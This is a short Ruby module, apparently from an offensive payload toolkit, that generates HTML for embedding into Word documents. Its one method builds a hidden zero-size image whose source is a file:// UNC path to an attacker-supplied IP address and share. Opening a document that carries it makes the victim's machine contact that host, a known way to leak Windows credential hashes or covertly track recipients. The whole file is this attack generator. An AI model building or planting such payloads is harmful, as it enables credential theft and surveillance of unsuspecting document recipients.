#!/usr/bin/env ruby
#encoding: ASCII-8BIT
=begin
 for generating img embeded into word docs 
=end

module ZFPayload
  class Worddoc
    def self.build(ip,path,file,params=nil)
      content = "<html>
<body>
<img src=\"file:////" + ip + "/" + path + "/" + file + "\" width=0 height=0>
</body>
</html>
"      
      return content
    end
  end
end